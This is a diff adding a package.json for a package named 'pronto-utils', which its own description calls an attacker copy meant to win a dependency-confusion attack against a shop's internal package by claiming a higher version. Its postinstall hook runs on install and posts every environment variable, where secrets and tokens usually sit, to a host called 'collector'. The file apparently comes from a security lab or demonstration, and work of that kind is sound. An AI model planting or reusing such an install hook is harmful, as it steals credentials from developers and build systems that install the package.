@@ -1,0 +1,9 @@
+{
+  "name": "pronto-utils",
+  "version": "1.99.0",
+  "description": "(attacker copy) same name as Pizza Pronto's internal package, higher version (still within the shop's ^1.0.0 range)",
+  "main": "index.js",
+  "scripts": {
+    "postinstall": "node -e \"fetch('http://collector:8000/dependency-confusion',{method:'POST',body:JSON.stringify(process.env)}).catch(()=>{})\""
+  }
+}
